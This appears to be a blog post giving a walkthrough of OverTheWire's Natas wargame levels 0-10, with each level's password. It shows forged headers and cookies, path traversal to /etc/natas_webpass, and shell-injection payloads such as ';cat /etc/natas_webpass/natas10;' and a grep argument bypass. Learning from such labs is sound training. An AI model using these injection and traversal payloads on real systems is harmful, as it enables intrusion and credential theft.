---
title: "Linux training with overthewire [Part 4/10: Natas 1-10]"
author: Florian Courgey
layout: post
categories:
  - opensource
  - linux
  - bash
  - shell
  - hack
  - server
---
Excerpt here...
<!--more-->

This post is part of a series:
- [Linux training with overthewire Part 1: Bandit 1-10]({% post_url 2018-11-30-linux-training-overthewire-bandit-1 %})
- [Linux training with overthewire Part 2: Bandit 11-20]({% post_url 2018-11-30-linux-training-overthewire-bandit-2 %})
- [Linux training with overthewire Part 3: Bandit 21-30]({% post_url 2018-11-30-linux-training-overthewire-bandit-3 %})
- Linux training with overthewire Part 4: Natas
- [Linux training with overthewire Part 5: Natas 11-]({% post_url 2018-11-30-linux-training-overthewire-natas-2 %})
- [Linux training with overthewire Part 5: Leviathan]({% post_url 2018-11-30-linux-training-overthewire-leviathan %})

### Level 0 - View source
```
http://natas0.natas.labs.overthewire.org/ natas0 natas0
```
Right Click > View Source:

`<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->`

### Level 1 - Inspector
```
http://natas1.natas.labs.overthewire.org/ natas1 gtVrDuiDfck831PqWsLEZy5gyDz1clto
```
In Chrome, 2 options:
- view-source:http://natas1.natas.labs.overthewire.org/
- <kbd>Ctrl</kbd> <kbd>Shift</kbd> <kbd>J</kbd>

`<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->`

### Level 2 - Apache file listing
```
http://natas2.natas.labs.overthewire.org/ natas2 ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
```
http://natas2.natas.labs.overthewire.org/files/users.txt

`natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14`

### Level 3 - robots.txt
```
http://natas3.natas.labs.overthewire.org/ natas3 sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
```
- http://natas3.natas.labs.overthewire.org/robots.txt
```
User-agent: *
Disallow: /s3cr3t/
```
- http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt

`natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ`

### Level 4 - Modify HTTP headers
```
http://natas4.natas.labs.overthewire.org/ natas4 Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```
The idea is to modify the HTTP header `Referer`. 3 options:
- Use any HTTP Header browser extension ([for Firefox](https://addons.mozilla.org/en-US/firefox/search/?platform=windows&q=http%20header) and [for Chrome](https://chrome.google.com/webstore/search/http%20header))
- Get the browser application [RestClient]
- `curl` to edit the header:
```bash
curl 'http://natas4.natas.labs.overthewire.org' -H 'Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va' -H 'Referer: http://natas5.natas.labs.overthewire.org/'
```
> bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va is the result of base64(natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ)

`Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq`

### Level 5 - Modify cookies
```
http://natas5.natas.labs.overthewire.org/ natas5 iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```
Same here, the HTTP response sets a Cookie: `Set-Cookie: loggedin=0`.

2 options:
- Download an extension
- `curl`
```bash
curl 'http://natas5.natas.labs.overthewire.org/' -H 'Authorization: Basic bmF0YXM1OmlYNklPZm1wTjdBWU9RR1B3dG4zZlhwYmFKVkpjSGZx' -H 'Cookie: __cfduid=d367f554011c7c1ab2210015e9dc5ac931544566497; loggedin=1'
```
`Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`

### Level 6 - PHP include exploit 1
```
http://natas6.natas.labs.overthewire.org/ natas6 aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```
The source includes another file:
```php
include "includes/secret.inc";
```
Open http://natas6.natas.labs.overthewire.org/includes/secret.inc
```php
$secret = "FOEIUWGHFEEUHOFUOIU";
```
Input it in the form and submit:
`Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9`

### Level 7 - PHP include exploit 2
```
http://natas7.natas.labs.overthewire.org/ natas7 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```
Source:
```html
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```
Test:
`natas7.natas.labs.overthewire.org/index.php?page=..`
`include(/var/www/natas): failed to open stream`

Exploit:
`http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8`
`DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`

### Level 8 - PHP basic 2-way encoding functions
```
http://natas8.natas.labs.overthewire.org/ natas8 DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```
The source shows `return bin2hex(strrev(base64_encode($secret)));`, let's reverse it:
```bash
$ php -r "echo base64_decode(strrev(hex2bin('3d3d516343746d4d6d6c315669563362')));"
oubWYf2kBq
```
Input it in the form and here we are:
`Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl`

### Level 9 - Shell injection
```
http://natas9.natas.labs.overthewire.org/ natas9 W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```
Source shows a variable from the POST being injected into the PHP `passthru` function ([see passthru on php.net](https://secure.php.net/manual/en/function.passthru.php)).
```php
$key = $_REQUEST["needle"]; // $key is coming from the form POST input
passthru("grep -i $key dictionary.txt"); // passthru executes a shell command on the server
```
Let's inject some basic code such as `;ls -alh;` so the executed code becomes
```bash
grep -i ;ls -alh; dictionary.txt
```

```terminal
Output:
total 480K
drwxr-x---  2 natas9 natas9 4.0K Dec 20  2016 .
drwxr-xr-x 41 root   root   4.0K Oct 29 04:27 ..
-rw-r-----  1 natas9 natas9  118 Dec 20  2016 .htaccess
-rw-r-----  1 natas9 natas9  126 Oct 20 09:08 .htpasswd
-rw-r-----  1 natas9 natas9 451K Dec 15  2016 dictionary.txt
-rw-r-----  1 natas9 natas9 2.0K Dec 20  2016 index-source.html
-rw-r-----  1 natas9 natas9 1.2K Dec 20  2016 index.php
-rw-r-----  1 natas9 natas9 1.2K Dec 15  2016 index.php.tmpl
```

We can run pretty much anything (such as the classic enumerations `;ls /home;`, `;ls ..;`, `;pwd;`, `;uname -a;`..) and find with `;id;` that the running user is `uid=30009(natas9)`.

Also, like in the [Bandit series]({% post_url 2018-11-30-linux-training-overthewire-bandit-1 %}), passwords might be in `/etc`:
```bash
$ ;ls -alh /etc;
d---------  2 root root   4.0K Oct 29 04:27 natas_pass # not readable
drwx------  2 root root   4.0K Oct 25 06:30 natas_session_toucher # not readable
drwxr-xr-x  2 root root   4.0K Oct 29 04:27 natas_webpass # readable by anyone!!
$ ;ls -alh /etc/natas_webpass;
-r--r-----  1 natas9  natas8    33 Dec 20  2016 natas9
-r--r-----  1 natas10 natas9    33 Dec 20  2016 natas10 # natas10 pwd is group-readable by natas9
$ ;cat /etc/natas_webpass/natas10;
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```

References
- https://en.wikipedia.org/wiki/Code_injection#Shell_injection
- https://www.owasp.org/index.php/Testing_for_Command_Injection_(OTG-INPVAL-013)
- https://github.com/PortSwigger/command-injection-attacker

### Level 10 - Shell injection with forbidden characters
```
http://natas10.natas.labs.overthewire.org/ natas10 nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```
Now characters `;` `|` and `&` are filtered via a regex. We need to get creative. `grep` can look into multiple files:
```bash
grep -i pattern file1 file2
# so as we have file=dictionary.txt:
grep -i $key dictionary.txt
# we can set $key to have to pattern="any letter" AND file1=/etc/natas_webpass/natas10
grep -i -e [a-z] /etc/natas_webpass/natas11 dictionary.txt # -e [a-z] is a regex matching any lowercase letter
```
So with the input `-e [a-z] /etc/natas_webpass/natas11` we get
```
Output:
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```

> This method works also for the previous challenge


This post is part of a series:
- [Linux training with overthewire Part 1: Bandit 1-10]({% post_url 2018-11-30-linux-training-overthewire-bandit-1 %})
- [Linux training with overthewire Part 2: Bandit 11-20]({% post_url 2018-11-30-linux-training-overthewire-bandit-2 %})
- [Linux training with overthewire Part 3: Bandit 21-30]({% post_url 2018-11-30-linux-training-overthewire-bandit-3 %})
- Linux training with overthewire Part 4: Natas 1-10
- [Linux training with overthewire Part 5: Natas 11-]({% post_url 2018-11-30-linux-training-overthewire-natas-2 %})
- [Linux training with overthewire Part 5: Leviathan]({% post_url 2018-11-30-linux-training-overthewire-leviathan %})
